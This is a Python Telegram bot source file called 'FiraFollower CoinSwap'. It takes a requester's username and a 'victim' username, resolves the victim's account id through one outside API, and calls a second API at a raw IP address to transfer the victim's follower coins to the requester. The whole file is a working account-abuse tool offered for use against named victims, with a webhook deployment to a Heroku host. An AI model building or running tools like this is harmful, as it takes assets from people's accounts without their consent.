import requests
import telebot
import os
import random
from config import *
from flask import Flask, request
bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
@bot.message_handler(commands=["start"])
def start(message):
    bot.send_message(message.chat.id,f"<strong>Hi {message.from_user.first_name},\n== === ==\nWellcome In FiraFollower CoinSwap! \nSend Your User and vicitm User Like :\n YourUser:VicUser\n== === ==\nBy: @trprogram </strong>",parse_mode="html")
@bot.message_handler(func=lambda m:True)
def so(message):
    bot.send_message(message.chat.id,f"<strong>Wait Please! </strong>",parse_mode="html")
    use = message.text.split(':')[0]
    user = message.text.split(':')[1]
    url1 = requests.get(f"https://echoar.ml/Apimedia/infon.php?user={user}").json()
    p = url1["Info"]["account_id"]
    bot.send_message(message.chat.id,f"<strong>Done Get Vicitim Id : {p}\nPlease Wait... </strong>",parse_mode="html")
    coi = requests.get(f"http://51.158.83.159/api/Fira?UserID={p}&Username={use}").json()
    if coi['status'] =="ok":
        print(coi)
        mes = coi['message']
        log = """
Done Swwaped! 
— — — — —
{mes}
— — — — —
By : @trprogram 
        """
        bot.send_message(message.chat.id,f"<strong>{log}</strong>",parse_mode="html")
    if coi['status'] == "nok":
        bot.send_message(message.chat.id,f"<strong>Error With Swap! ✖️</strong>",parse_mode="html")
    else:
        bot.send_message(message.chat.id,f"<strong>Problem With Api Or You Are Blocked 🚫</strong>",parse_mode="html")
@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://siiidra.herokuapp.com/"+str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))